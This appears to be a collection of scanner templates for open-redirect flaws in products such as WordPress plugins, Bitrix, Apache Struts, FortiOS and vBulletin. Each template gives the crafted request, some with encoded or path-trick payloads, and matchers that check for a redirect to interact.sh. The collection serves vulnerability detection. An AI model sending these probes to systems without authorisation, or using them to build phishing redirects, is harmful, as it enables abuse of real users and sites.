# HTTPBin - Open Redirect

## Description

- HTTPBin contains an open redirect vulnerability. An attacker can redirect a user to a malicious site and possibly obtain sensitive information, modify data, and/or execute unauthorized operations.
- severity - low
- tags - redirect,httpbin,oss

## Requests

- Method - GET

### URL

- {{BaseURL}}/redirect-to?url=https%3A%2F%2Finteract.sh

### Matchers

**Type - dsl**

- dsl
  1. location == "https://interact.sh"

**Type - status**

- status
  1. 302

---

# WordPress ProStore \<1.1.3 - Open Redirect

## Description

- WordPress ProStore theme before 1.1.3 contains an open redirect vulnerability. An attacker can redirect a user to a malicious site and possibly obtain sensitive information, modify data, and/or execute unauthorized operations.
- severity - low
- tags - wordpress,wp-theme,redirect,wpscan

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/themes/prostore/go.php?https://interact.sh/

### Matchers

**Type - regex**

- regex
  1. (?m)^(?:Location\s*?:\s*?)(?:https?://|//)?(?:[a-zA-Z0-9\-_\.@]_)interact\.sh._$
- part - header

---

# WordPress eCommerce Music Store \<=1.0.14 - Open Redirect

## Description

- WordPress eCommerce Music Store plugin through 1.0.14 contains an open redirect vulnerability via the referer header. An attacker can redirect a user to a malicious site and possibly obtain sensitive information, modify data, and/or execute unauthorized operations.
- severity - medium
- tags - musicstore,wp,wpscan,seclists,wordpress,redirect,wp-plugin

## Requests

### Step - 1

```
GET /wp-content/plugins/music-store/ms-core/ms-submit.php HTTP/1.1
Host: {{Hostname}}
Referer: https://interact.sh

```

### Matchers

**Type - regex**

- part - header
- regex
  1. (?m)^(?:Location\s*?:\s*?)(?:https?:\/\/|\/\/|\/\\\\|\/\\)?(?:[a-zA-Z0-9\-_\.@]_)interact\.sh\/?(\/|[^.]._)?$

---

# WordPress Brandfolder - Open Redirect (RFI & LFI)

## Description

- WordPress Brandfolder is vulnerable to remote/local file inclusion and allows remote attackers to inject an arbitrary URL into the 'callback.php' endpoint via the 'wp_abspath' parameter which will redirect the victim to it.

- severity - medium
- tags - wp,brandfolder,edb,wpscan,wp-plugin,redirect,rfi,wordpress,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/brandfolder/callback.php?wp_abspath=https://interact.sh/

### Matchers

**Type - regex**

- part - header
- regex
  1. (?m)^(?:Location\s*?:\s*?)(?:https?://|//)?(?:[a-zA-Z0-9\-_\.@]_)interact\.sh._$

---

# WordPress Newsletter Manager \< 1.5 - Unauthenticated Open Redirect

## Description

- WordPress Newsletter Manager \< 1.5 is susceptible to an open redirect vulnerability. The plugin used base64 encoded user input in the appurl parameter without validation to redirect users using the header() PHP function, leading to an open redirect issue.
- severity - medium
- tags - redirect,wp-plugin,newsletter,wp,wpscan,wordpress

## Requests

- Method - GET

### URL

- {{BaseURL}}/?wp_nlm=confirmation&appurl=aHR0cDovL2ludGVyYWN0LnNo

### Matchers

**Type - regex**

- part - header
- regex
  1. (?m)^(?:Location\s*?:\s*?)(?:https?:\/\/|\/\/|\/\\\\|\/\\)?(?:[a-zA-Z0-9\-_\.@]_)interact\.sh\/?(\/|[^.]._)?$

---

# WordPress Age Gate \<2.13.5 - Open Redirect

## Description

- WordPress Age Gate plugin before 2.13.5 contains an open redirect vulnerability via the \_wp_http_referer parameter after certain actions and after invalid or missing nonces. An attacker can redirect a user to a malicious site and possibly obtain sensitive information, modify data, and/or execute unauthorized operations.
- severity - low
- tags - agegate,unauth,wpscan,packetstorm,wp-plugin,redirect,wordpress,wp

## Requests

- Method - POST
- Method - POST

### URL

- {{BaseURL}}/wp-admin/admin-post.php
  - age_gate%5Bd%5D=10&age_gate%5Bm%5D=10&age_gate%5By%5D=1990&age_gate%5Bremember%5D=1&age_gate%5Bage%5D=TVRnPQ%3D%3D&action=age_gate_submit&age_gate%5Bnonce%5D=48f2b89fed&\_wp_http_referer=https://interact.sh

### Matchers

**Type - regex**

- part - header
- regex
  1. (?m)^(?:Location\s*?:\s*?)(?:https?:\/\/|\/\/|\/\\\\|\/\\)?(?:[a-zA-Z0-9\-_\.@]_)interact\.sh\/?(\/|[^.]._)?$

---

# WordPress All-in-One Security \<=4.4.1 - Open Redirect

## Description

- WordPress All-in-One Security plugin through 4.4.1 contains an open redirect vulnerability which can expose the actual URL of the hidden login page feature. An attacker can redirect a user to a malicious site and possibly obtain sensitive information, modify data, and/or execute unauthorized operations.

- severity - low
- tags - wp-plugin,redirect,wordpress,wp,wpscan

## Requests

- Method - GET

### URL

- {{BaseURL}}/?aiowpsec_do_log_out=1&after_logout=https://interact.sh

### Matchers

**Type - regex**

- part - header
- regex
  1. (?m)^(?:Location\s*?:\s*?)(?:https?:\/\/|\/\/|\/\\\\|\/\\)?(?:[a-zA-Z0-9\-_\.@]_)interact\.sh\/?(\/|[^.]._)?$

---

# WordPress Ultimate Member \<2.1.7 - Open Redirect

## Description

- WordPress Ultimate Member plugin before 2.1.7 contains an open redirect vulnerability on the registration and login pages via the "redirect_to" GET parameter. An attacker can redirect a user to a malicious site and possibly obtain sensitive information, modify data, and/or execute unauthorized operations.
- severity - medium
- tags - wp-plugin,redirect,wordpress,wpscan

## Requests

- Method - GET

### URL

- {{BaseURL}}/register/?redirect_to=https://interact.sh/

### Matchers

**Type - regex**

- regex
  1. (?m)^(?:Location\s*?:\s*?)(?:https?://|//)(?:[a-zA-Z0-9\-_\.@]_)interact\.sh._$
- part - header

---

# WordPress Eatery 2.2 - Open Redirect

## Description

- WordPress Eatery theme 2.2 contains an open redirect vulnerability. The theme accepts a user-controlled input that specifies a link to an external site. An attacker can redirect a user to a malicious site and possibly obtain sensitive information, modify data, and/or execute unauthorized operations.

- severity - low
- tags - wordpress,wp-theme,redirect,wp

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/themes/eatery/nav.php?-Menu-=https://interact.sh/

### Matchers

**Type - regex**

- part - header
- regex
  1. (?m)^(?:Location\s*?:\s*?)(?:https?://|//)?(?:[a-zA-Z0-9\-_\.@]_)interact\.sh._$

---

# WordPress Grimag \<1.1.1 - Open Redirection

## Description

- WordPress Grimag theme before 1.1.1 contains an open redirect vulnerability. An attacker can redirect a user to a malicious site and possibly obtain sensitive information, modify data, and/or execute unauthorized operations.
- severity - low
- tags - wp-theme,redirect,wpscan,wordpress

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/themes/Grimag/go.php?https://interact.sh

### Matchers

**Type - regex**

- regex
  1. (?m)^(?:Location\s*?:\s*?)(?:https?://|//)?(?:[a-zA-Z0-9\-_\.@]_)interact\.sh._$
- part - header

---

# WordPress GTranslate \<2.8.11 - Open Redirect

## Description

- Translate WordPress with GTranslate plugin before 2.8.11 contains an open redirect vulnerability. An attacker can redirect a user to a malicious site and possibly obtain sensitive information, modify data, and/or execute unauthorized operations.
- severity - medium
- tags - redirect,wordpress

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/gtranslate/url_addon/gtranslate.php?glang=en&gurl=/www.pluginvulnerabilities.com

### Matchers

**Type - word**

- words
  1. Location: www.pluginvulnerabilities.com
- part - header

**Type - status**

- status
  1. 301

---

# WordPress Pie Register \< 3.7.2.4 - Open Redirect

## Description

- WordPress Pie Register \< 3.7.2.4 is susceptible to an open redirect vulnerability because the plugin passes unvalidated user input to the wp_redirect() function.
- severity - low
- tags - redirect,wp-plugin,pieregister,wpscan,wordpress

## Requests

- Method - GET

### URL

- {{BaseURL}}/?piereg_logout_url=true&redirect_to=https://interact.sh

### Matchers

**Type - regex**

- part - header
- regex
  1. (?m)^(?:Location\s*?:\s*?)(?:https?://|//)?(?:[a-zA-Z0-9\-_\.@]_)interact\.sh._$

---

# WordPress Attitude 1.1.1 - Open Redirect

## Description

- WordPress Attitude theme 1.1.1 contains an open redirect vulnerability via the goto.php endpoint. An attacker can redirect a user to a malicious site and possibly obtain sensitive information, modify data, and/or execute unauthorized operations.
- severity - low
- tags - wordpress,wp-theme,redirect

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/themes/Attitude/go.php?https://interact.sh/

### Matchers

**Type - regex**

- regex
  1. (?m)^(?:Location\s*?:\s*?)(?:https?://|//)?(?:[a-zA-Z0-9\-_\.@]_)interact\.sh._$
- part - header

---

# WordPress WPtouch 3.x - Open Redirect

## Description

- WordPress WPtouch plugin 3.x contains an open redirect vulnerability. The plugin fails to properly sanitize user-supplied input. An attacker can redirect a user to a malicious site and possibly obtain sensitive information, modify data, and/or execute unauthorized operations.

- severity - medium
- tags - wp-plugin,redirect,wordpress

## Requests

- Method - GET

### URL

- {{BaseURL}}/?wptouch_switch=desktop&redirect=https://interact.sh/

### Matchers

**Type - regex**

- regex
  1. (?m)^(?:Location\s*?:\s*?)(?:https?://|//)(?:[a-zA-Z0-9\-_\.@]_)interact\.sh._$
- part - header

---

# WordPress Weekender Newspaper 9.0 - Open Redirect

## Description

- WordPress Weekender Newspaper theme 9.0 contains an open redirect vulnerability. An attacker can redirect a user to a malicious site and possibly obtain sensitive information, modify data, and/or execute unauthorized operations.
- severity - low
- tags - wordpress,wp-plugin,redirect

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/themes/weekender/friend.php?id=aHR0cHM6Ly9pbnRlcmFjdC5zaA==

### Matchers

**Type - regex**

- regex
  1. (?m)^(?:Location\s*?:\s*?)(?:https?://|//)?(?:[a-zA-Z0-9\-_\.@]_)interact\.sh._$
- part - header

---

# DedeCMS - Open Redirect

## Description

- DedeCMS contains an open redirect vulnerability. An attacker can redirect a user to a malicious site and possibly obtain sensitive information, modify data, and/or execute unauthorized operations.
- severity - low
- tags - dedecms,redirect

## Requests

- Method - GET

### URL

- {{BaseURL}}/plus/download.php?open=1&link=aHR0cHM6Ly9pbnRlcmFjdC5zaA==

### Matchers

**Type - word**

- words
  1. Location: https://interact.sh
- part - header

**Type - status**

- status
  1. 302

---

# Open Redirect - Detection

## Description

- An open redirect vulnerability was detected. An attacker can redirect a user to a malicious site and possibly obtain sensitive information, modify data, and/or execute unauthorized operations.
- severity - low
- tags - redirect,generic

## Requests

### Step - 1

```
GET /{{redirect}} HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - regex**

- part - header
- regex
  1. (?m)^(?:Location\s*?:\s*?)(?:https?:\/\/|\/\/|\/\\\\|\/\\)?(?:[a-zA-Z0-9\-_\.@]_)interact\.sh\/?(\/|[^.]._)?$

**Type - status**

- status
  1. 301
  2. 302
  3. 307
  4. 308
- condition - or

**Payloads**- redirect

---

# Netsweeper 4.0.9 - Open Redirect

## Description

- Netsweeper 4.0.9 contains an open redirect vulnerability. An attacker can redirect a user to a malicious site and possibly obtain sensitive information, modify data, and/or execute unauthorized operations.
- severity - medium
- tags - netsweeper,redirect,packetstorm

## Requests

- Method - GET

### URL

- {{BaseURL}}/webadmin/authportal/bounce.php?url=https://interact.sh/

### Matchers

**Type - regex**

- part - header
- regex
  1. (?m)^(?:Location\s*?:\s*?)(?:https?://|//)(?:[a-zA-Z0-9\-_\.@]_)interact\.sh._$

---

# Odoo CMS - Open Redirect

## Description

- Odoo CMS contains an open redirect vulnerability. An attacker can redirect a user to a malicious site and possibly obtain sensitive information, modify data, and/or execute unauthorized operations.
- severity - low
- tags - odoo,redirect

## Requests

- Method - GET

### URL

- {{BaseURL}}/website/lang/en_US?r=https://interact.sh/

### Matchers

**Type - regex**

- regex
  1. (?m)^(?:Location\s*?:\s*?)(?:https?://|//)?(?:[a-zA-Z0-9\-_\.@]_)interact\.sh._$
- part - header

---

# SAP Solution Manager - Open Redirect

## Description

- SAP Solution Manager contains an open redirect vulnerability via the logoff endpoint. An attacker can redirect a user to a malicious site and possibly obtain sensitive information, modify data, and/or execute unauthorized operations.
- severity - medium
- tags - redirect,sap

## Requests

- Method - GET

### URL

- {{BaseURL}}/sap/public/bc/icf/logoff?redirecturl=https://interact.sh

### Matchers

**Type - status**

- status
  1. 302

**Type - word**

- words
  1. Location: https://www.interact.sh
  2. Location: https://interact.sh
- condition - or
- part - header

---

# Thinkific - Open Redirect

## Description

- Thinkific contains an open redirect vulnerability via the http://interact.sh URL. An attacker can redirect a user to a malicious site and possibly obtain sensitive information, modify data, and/or execute unauthorized operations.
- severity - medium
- tags - redirect

## Requests

- Method - GET

### URL

- {{BaseURL}}/api/sso/v2/sso/jwt?error_url=http://interact.sh

### Matchers

**Type - status**

- status
  1. 302

**Type - word**

- words
  1. \<a href="http://interact.sh?kind=jwt&message=Nil+JSON+web+token"
- condition - or
- part - body

---

# HomeAutomation 3.3.2 - Open Redirect

## Description

- HomeAutomation 3.3.2 contains an open redirect vulnerability. An attacker can inject a redirect URL via the api.php endpoint and the redirect parameter, making it possible to redirect a user to a malicious site and possibly obtain sensitive information, modify data, and/or execute unauthorized operations.
- severity - medium
- tags - homeautomation,packetstorm,iot,redirect

## Requests

- Method - GET

### URL

- {{BaseURL}}/homeautomation_v3_3_2/api.php?do=groups/toggle&groupid=1&status=1&redirect=https://interact.sh/

### Matchers

**Type - regex**

- regex
  1. (?m)^(?:Location\s*?:\s*?)(?:https?://|//)?(?:[a-zA-Z0-9\-_\.@]_)interact\.sh._$
- part - header

---

# Bitrix Site Management Russia 2.0 - Open Redirect

## Description

- Bitrix Site Management Russia 2.0 contains an open redirect vulnerability. An attacker can redirect a user to a malicious site and possibly obtain sensitive information, modify data, and/or execute unauthorized operations.
- severity - low
- tags - redirect,bitrix,packetstorm

## Requests

- Method - GET

### URL

- {{BaseURL}}/bitrix/rk.php?goto=https://interact.sh
- {{BaseURL}}/bitrix/redirect.php?event1=&event2=&event3=&goto=https://interact.sh
- {{BaseURL}}/bitrix/redirect.php?event3=352513&goto=https://interact.sh
- {{BaseURL}}/bitrix/redirect.php?event1=demo_out&event2=sm_demo&event3=pdemo&goto=https://interact.sh
- {{BaseURL}}/bitrix/redirect.php?site_id=s1&event1=select_product_t1&event2=contributions&goto=https://interact.sh
- {{BaseURL}}/bitrix/redirect.php?event1=&event2=&event3=download&goto=https://interact.sh
- {{BaseURL}}/bitrix/rk.php?id=28&site_id=s2&event1=banner&event2=click&event3=3+%2F+%5B28%5D+%5BBANNER_AREA_FOOTER2%5D+%D0%9F%D0%BE%D1%81%D0%B5%D1%82%D0%B8%D1%82%D0%B5+%D0%B2%D0%B2%D0%BE%D0%B4%D0%BD%D1%83%D1%8E+%D0%B1%D0%B5%D1%81%D0%BF%D0%BB%D0%B0%D1%82%D0%BD%D1%83%D1%8E+%D0%BB%D0%B5%D0%BA%D1%86%D0%B8%D1%8E+APTOS&goto=https://interact.sh
- {{BaseURL}}/bitrix/rk.php?id=84&site_id=n1&event1=banner&event2=click&event3=1+%2F+%5B84%5D+%5BMOBILE_HOME%5D+Love+Card&goto=https://interact.sh
- {{BaseURL}}/bitrix/rk.php?id=691&site_id=s3&event1=banner&event2=click&event3=1+%2F+%5B691%5D+%5BNEW_INDEX_BANNERS%5D+Trade-in+football&goto=https://interact.sh
- {{BaseURL}}/bitrix/rk.php?id=129&event1=banner&event2=click&event3=5+%2F+%5B129%5D+%5BGARMIN_AKCII%5D+Garmin+%E1%EE%ED%F3%F1+%ED%EE%E2%EE%F1%F2%FC+%E2+%E0%EA%F6%E8%E8&goto=https://interact.sh
- {{BaseURL}}/bitrix/redirect.php?event1=%D0%A1%D0%BF%D0%B5%D1%86%D0%B8%D0%B0%D0%BB%D1%8C%D0%BD%D1%8B%D0%B5+%D0%B4%D0%BE%D0%BA%D0%BB%D0%B0%D0%B4%D1%8B&event2=&event3=download&goto=https://interact.sh
- {{BaseURL}}/bitrix/redirect.php?event1=%D0%A1%D0%BF%D0%B5%D1%86%D0%B8%D0%B0%D0%BB%D1%8C%D0%BD%D1%8B%D0%B5+%D0%B4%D0%BE%D0%BA%D0%BB%D0%B0%D0%B4%D1%8B&event2=&event3=download&goto=https://interact.sh

### Matchers

**Type - regex**

- regex
  1. (?m)^(?:Location\s*?:\s*?)(?:https?://|//)?(?:[a-zA-Z0-9\-_\.@]_)interact\.sh._$
- part - header

**Type - status**

- condition - or
- status
  1. 302
  2. 301

---

# IceWarp - Open Redirect

## Description

- IceWarp open redirect vulnerabilities were detected. An attacker can redirect a user to a malicious site and possibly obtain sensitive information, modify data, and/or execute unauthorized operations.
- severity - medium
- tags - icewarp,redirect

## Requests

### Step - 1

```
GET ///interact.sh/%2F.. HTTP/1.1

```

### Matchers

**Type - word**

- part - header
- words
  1. IceWarp

**Type - regex**

- part - header
- regex
  1. (?m)^(?:Location\s*?:\s*?)(?:https?:\/\/|\/\/|\/\\\\|\/\\)?(?:[a-zA-Z0-9\-_\.@]_)interact\.sh\/?(\/|[^.]._)?$

### Extractors

**Type - regex**

- name - redirected
- part - header
- group - 1
- regex
  1. Server: (.{4,20})

---

# ASP-Nuke - Open Redirect

## Description

- ASP-Nuke contains an open redirect vulnerability. An attacker can redirect a user to a malicious site and possibly obtain sensitive information, modify data, and/or execute unauthorized operations.
- severity - low
- tags - packetstorm,aspnuke,redirect

## Requests

- Method - GET

### URL

- {{BaseURL}}/gotoURL.asp?url=interact.sh&id=43569

### Matchers

**Type - regex**

- part - header
- regex
  1. (?m)^(?:Location\s*:\s*)(?:https?://|//)?(?:[a-zA-Z0-9\-_]_\.)?interact\.sh(?:\s_)$

---

# Otobo - Open Redirect

## Description

- Otobo contains an open redirect vulnerability. An attacker can redirect a user to a malicious site and possibly obtain sensitive information, modify data, and/or execute unauthorized operations.
- severity - medium
- tags - redirect,otobo,huntr

## Requests

- Method - GET

### URL

- {{BaseURL}}/otobo/index.pl?Action=ExternalURLJump;URL=http://www.interact.sh

### Matchers

**Type - regex**

- part - header
- regex
  1. (?m)^(?:Location\s*?:\s*?)(?:https?:\/\/|\/\/|\/\\\\|\/\\)?(?:[a-zA-Z0-9\-_\.@]_)interact\.sh\/?(\/|[^.]._)?$

---

# Mozilla Pollbot - Open Redirect

## Description

- Mozilla Pollbot contains an open redirect vulnerability. An attacker can redirect a user to a malicious site and possibly obtain sensitive information, modify data, and/or execute unauthorized operations.
- severity - medium
- tags - redirect,mozilla,pollbot

## Requests

- Method - GET

### URL

- {{BaseURL}}/%0A/interact.sh/

### Matchers

**Type - regex**

- part - header
- regex
  1. (?m)^(?:Location\s*?:\s*?)(?:https?:\/\/|\/\/|\/\\\\|\/\\)?(?:[a-zA-Z0-9\-_\.@]_)interact\.sh\/?(\/|[^.]._)?$

**Type - status**

- status
  1. 301

---

# Apache Struts - Multiple Open Redirection Vulnerabilities

## Description

- Apache Struts is prone to multiple open-redirection vulnerabilities because the application fails to properly sanitize user-supplied input.
- severity - low
- tags - cve,cve2013,apache,redirect,struts,edb

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.action?redirect:http://www.interact.sh/

### Matchers

**Type - regex**

- regex
  1. (?m)^(?:Location\s*?:\s*?)(?:https?://|//)?(?:[a-zA-Z0-9\-_\.@]_)interact\.sh._$
- part - header

---

# Grav \<1.7 - Open Redirect

## Description

- Grav before 1.7 has an open redirect vulnerability via common/Grav.php. This is partially fixed in 1.6.23 and still present in 1.6.x.
- severity - medium
- tags - cve,cve2020,redirect,grav,getgrav

## Requests

- Method - GET

### URL

- {{BaseURL}}/%252f%255cinteract.sh%252fa%253fb/

### Matchers

**Type - regex**

- regex
  1. (?m)^(?:Location\s*?:\s*?)(?:https?:\/\/|\/\/|\/\\\\|\/\\)?(?:[a-zA-Z0-9\-_\.@]_)interact\.sh\/?(\/|[^.]._)?$
- part - header

---

# OPNsense \<=20.1.5 - Open Redirect

## Description

- OPNsense through 20.1.5 contains an open redirect vulnerability via the url redirect parameter in the login page, which is not filtered. An attacker can redirect a user to a malicious site and possibly obtain sensitive information, modify data, and/or execute unauthorized operations.
- severity - medium
- tags - cve,cve2020,redirect,opnsense

## Requests

- Method - GET

### URL

- {{BaseURL}}/?url=http://interact.sh

### Matchers

**Type - regex**

- part - header
- regex
  1. (?m)^(?:Location\s*?:\s*?)(?:https?://|//)?(?:[a-zA-Z0-9\-_]_\.)?interact\.sh(?:\s_?)$

---

# b2evolution CMS \<6.11.6 - Open Redirect

## Description

- b2evolution CMS before 6.11.6 contains an open redirect vulnerability via the redirect_to parameter in email_passthrough.php. An attacker can redirect a user to a malicious site and possibly obtain sensitive information, modify data, and/or execute unauthorized operations.
- severity - medium
- tags - packetstorm,edb,cve,cve2020,redirect,b2evolution

## Requests

- Method - GET

### URL

- {{BaseURL}}/email_passthrough.php?email_ID=1&type=link&email_key=5QImTaEHxmAzNYyYvENAtYHsFu7fyotR&redirect_to=http%3A%2F%2Finteract.sh

### Matchers

**Type - regex**

- regex
  1. (?m)^(?:Location\s*?:\s*?)(?:https?://|//)?(?:[a-zA-Z0-9\-_]_\.)?interact\.sh(?:\s_?)$
- part - header

---

# Submitty 20.04.01 - Open redirect

## Description

- Submitty through 20.04.01 has an open redirect via authentication/login?old= during an invalid login attempt.
- severity - medium
- tags - cve,cve2020,redirect,submitty,oos

## Requests

### Step - 1

```
POST /authentication/check_login?old=http%253A%252F%252Fexample.com%252Fhome HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Content-Type: application/x-www-form-urlencoded
Referer: {{RootURL}}/authentication/login

user_id={{username}}&password={{password}}&stay_logged_in=on&login=Login

```

### Matchers

**Type - regex**

- part - header
- regex
  1. (?m)^(?:Location\s*?:\s*?)(?:https?:\/\/|\/\/|\/\\\\|\/\\)?(?:[a-zA-Z0-9\-_\.@]_)interact\.sh\/?(\/|[^.]._)?$

---

# EpiServer Find \<13.2.7 - Open Redirect

## Description

- EpiServer Find before 13.2.7 contains an open redirect vulnerability via the \_t_redirect parameter in a crafted URL, such as a /find_v2/\_click URL. An attacker can redirect a user to a malicious site and possibly obtain sensitive information, modify data, and/or execute unauthorized operations.
- severity - medium
- tags - cve,cve2020,redirect,episerver

## Requests

- Method - GET

### URL

- {{BaseURL}}/find_v2/\_click?\_t_id=&\_t_q=&\_t_hit.id=&\_t_redirect=https://interact.sh

### Matchers

**Type - word**

- part - header
- words
  1. Location: https://interact.sh

**Type - status**

- status
  1. 301

---

# Z-Blog \<=1.5.2 - Open Redirect

## Description

- Z-Blog 1.5.2 and earlier contains an open redirect vulnerability via the redirect parameter in zb_system/cmd.php. An attacker can redirect a user to a malicious site and possibly obtain sensitive information, modify data, and/or execute unauthorized operations.
- severity - medium
- tags - cve,cve2020,redirect,zblogphp,authenticated

## Requests

### Step - 1

```
POST /zb_system/cmd.php?act=verify HTTP/1.1
Host: {{Hostname}}
Content-Length: 81
Content-Type: application/x-www-form-urlencoded
Connection: close

btnPost=Log+In&username={{username}}&password={{md5("{{password}}")}}&savedate=0

```

### Step - 2

```
GET /zb_system/cmd.php?atc=login&redirect=http://www.interact.sh HTTP/2
Host: {{Hostname}}

```

### Matchers

**Type - regex**

- part - header
- regex
  1. (?m)^(?:Location\s*?:\s*?)(?:https?:\/\/|\/\/|\/\\\\|\/\\)?(?:[a-zA-Z0-9\-_\.@]_)interact\.sh\/?(\/|[^.]._)?$

---

# GLPI \<9.4.6 - Open Redirect

## Description

- GLPI prior 9.4.6 contains an open redirect vulnerability based on a regexp.
- severity - medium
- tags - cve,cve2020,redirect,glpi

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?redirect=/\/interact.sh/
- {{BaseURL}}/index.php?redirect=//interact.sh

### Matchers

**Type - regex**

- regex
  1. (?m)^(?:Location\s*?:\s*?)(?:https?://|//)?(?:[a-zA-Z0-9\-_]_\.)?interact\.sh(?:\s_?)$
- part - header

---

# Smartstore \<4.1.0 - Open Redirect

## Description

- Smartstore (aka "SmartStoreNET") before 4.1.0 contains an open redirect vulnerability via CommonController.ClearCache, ClearDatabaseCache, RestartApplication, and ScheduleTaskController.Edit. An attacker can redirect a user to a malicious site and possibly obtain sensitive information, modify data, and/or execute unauthorized operations.
- severity - medium
- tags - cve,cve2020,redirect,smartstore

## Requests

- Method - GET

### URL

- {{BaseURL}}/backend/admin/common/clearcache?previousUrl=http://www.interact.sh

### Matchers

**Type - regex**

- part - header
- regex
  1. (?m)^(?:Location\s*?:\s*?)(?:https?:\/\/|\/\/|\/\\\\|\/\\)?(?:[a-zA-Z0-9\-_\.@]_)interact\.sh\/?(\/|[^.]._)?$

---

# Traefik - Open Redirect

## Description

- Traefik before 1.7.26, 2.2.8, and 2.3.0-rc3 contains an open redirect vulnerability in the X-Forwarded-Prefix header. An attacker can redirect a user to a malicious site and possibly obtain sensitive information, modify data, and/or execute unauthorized operations.
- severity - medium
- tags - cve,cve2020,traefik,redirect

## Requests

- Method - GET

### URL

- {{BaseURL}}

### Matchers

**Type - status**

- status
  1. 302

**Type - word**

- part - body
- words
  1. \<a href="https://foo.nl/dashboard/">Found\</a>

---

# Fortinet FortiOS - Open Redirect/Cross-Site Scripting

## Description

- FortiOS Web User Interface in 5.0.x before 5.0.13, 5.2.x before 5.2.3, and 5.4.x before 5.4.0 allows remote attackers to redirect users to arbitrary web sites and conduct phishing attacks or cross-site scripting attacks via the "redirect" parameter to "login."
- severity - medium
- tags - cve2016,redirect,fortinet,fortios,seclists,cve

## Requests

- Method - GET

### URL

- {{BaseURL}}/login?redir=http://www.interact.sh

### Matchers

**Type - regex**

- part - header
- regex
  1. (?m)^(?:Location\s*?:\s*?)(?:https?:\/\/|\/\/|\/\\\\|\/\\)?(?:[a-zA-Z0-9\-_\.@]_)interact\.sh\/?(\/|[^.]._)?$

---

# Opsview Monitor Pro - Open Redirect

## Description

- Opsview Monitor Pro before 5.1.0.162300841, before 5.0.2.27475, before 4.6.4.162391051, and 4.5.x without a certain 2016 security patch contains an open redirect vulnerability. An attacker can redirect users to arbitrary web sites and conduct phishing attacks via the back parameter to the login URI.

- severity - medium
- tags - cve,cve2016,redirect,opsview,authenticated

## Requests

### Step - 1

```
POST /login HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

login_username={{username}}&login_password={{password}}&login=&back=//www.interact.sh&app=OPSVIEW

```

### Matchers

**Type - regex**

- part - header
- regex
  1. (?m)^(?:Location\s*?:\s*?)(?:https?:\/\/|\/\/|\/\\\\|\/\\)?(?:[a-zA-Z0-9\-_\.@]_)interact\.sh\/?(\/|[^.]._)?$

**Type - status**

- status
  1. 302

---

# vBulletin - Open Redirect

## Description

- vBulletin 3.x.x and 4.2.x through 4.2.5 contains an open redirect vulnerability via the redirector.php URL parameter. An attacker can redirect a user to a malicious site and possibly obtain sensitive information, modify data, and/or execute unauthorized operations.

- severity - medium
- tags - cve,cve2018,redirect,vbulletin

## Requests

- Method - GET

### URL

- {{BaseURL}}/redirector.php?url=https://interact.sh
- {{BaseURL}}/redirector.php?do=nodelay&url=https://interact.sh

### Matchers

**Type - word**

- part - body
- words
  1. \<meta http-equiv="refresh" content="0; URL=https://interact.sh">

**Type - status**

- status
  1. 200

---

# Eventum \<3.4.0 - Open Redirect

## Description

- Eventum before 3.4.0 contains an open redirect vulnerability. An attacker can redirect a user to a malicious site and possibly obtain sensitive information, modify data, and/or execute unauthorized operations.

- severity - medium
- tags - cve,cve2018,redirect,eventum,oss

## Requests

- Method - GET

### URL

- {{BaseURL}}/select_project.php?url=http://interact.sh
- {{BaseURL}}/clock_status.php?current_page=http://interact.sh

### Matchers

**Type - regex**

- part - header
- regex
  1. (?m)^(?:Location\s*?:\s*?)(?:https?:\/\/|\/\/|\/\\\\|\/\\)?(?:[a-zA-Z0-9\-_\.@]_)interact\.sh\/?(\/|[^.]._)?$

---

# Sympa version =>6.2.16 - Cross-Site Scripting

## Description

- Sympa version 6.2.16 and later contains a URL Redirection to Untrusted Site vulnerability in the referer parameter of the wwsympa fcgi login action that can result in open redirection and reflected cross-site scripting via data URIs.
- severity - medium
- tags - cve,cve2018,redirect,sympa,debian

## Requests

- Method - GET

### URL

- {{BaseURL}}/sympa?referer=http://interact.sh&passwd=&previous_action=&action=login&action_login=&previous_list=&list=&email=

### Matchers

**Type - regex**

- part - header
- regex
  1. (?m)^(?:Location\s*?:\s*?)(?:https?:\/\/|\/\/|\/\\\\|\/\\)?(?:[a-zA-Z0-9\-_\.@]_)interact\.sh\/?(\/|[^.]._)?$

---

# SV3C HD Camera L Series - Open Redirect

## Description

- SV3C HD Camera L Series 2.3.4.2103-S50-NTD-B20170508B and 2.3.4.2103-S50-NTD-B20170823B contains an open redirect vulnerability. It does not perform origin checks on URLs in the camera's web interface, which can be leveraged to send a user to an unexpected endpoint. An attacker can possibly obtain sensitive information, modify data, and/or execute unauthorized operations.

- severity - medium
- tags - cve,cve2018,redirect,sv3c,camera,iot

## Requests

- Method - GET

### URL

- {{BaseURL}}/web/cgi-bin/hi3510/param.cgi?cmd=setmobilesnapattr&cururl=http%3A%2F%2Finteract.sh

### Matchers

**Type - word**

- part - body
- words
  1. \<META http-equiv="Refresh" content="0;URL=http://interact.sh">

---

# dotCMS \<5.0.2 - Open Redirect

## Description

- dotCMS before 5.0.2 contains multiple open redirect vulnerabilities via the html/common/forward_js.jsp FORWARD_URL parameter or the html/portlet/ext/common/page_preview_popup.jsp hostname parameter. An attacker can redirect a user to a malicious site and possibly obtain sensitive information, modify data, and/or execute unauthorized operations.

- severity - medium
- tags - cve,cve2018,redirect,dotcms

## Requests

- Method - GET

### URL

- {{BaseURL}}/html/common/forward_js.jsp?FORWARD_URL=http://www.interact.sh
- {{BaseURL}}/html/portlet/ext/common/page_preview_popup.jsp?hostname=interact.sh

### Matchers

**Type - word**

- part - body
- words
  1. self.location = 'http://www.interact.sh'

**Type - status**

- status
  1. 200

---

# Polarisft Intellect Core Banking Software Version 9.7.1 - Open Redirect

## Description

- Polarisft Intellect Core Banking Software Version 9.7.1 is susceptible to an open redirect issue in the Core and Portal modules via the /IntellectMain.jsp?IntellectSystem= URI.
- severity - medium
- tags - cve,cve2018,redirect,polarisft,intellect

## Requests

- Method - GET

### URL

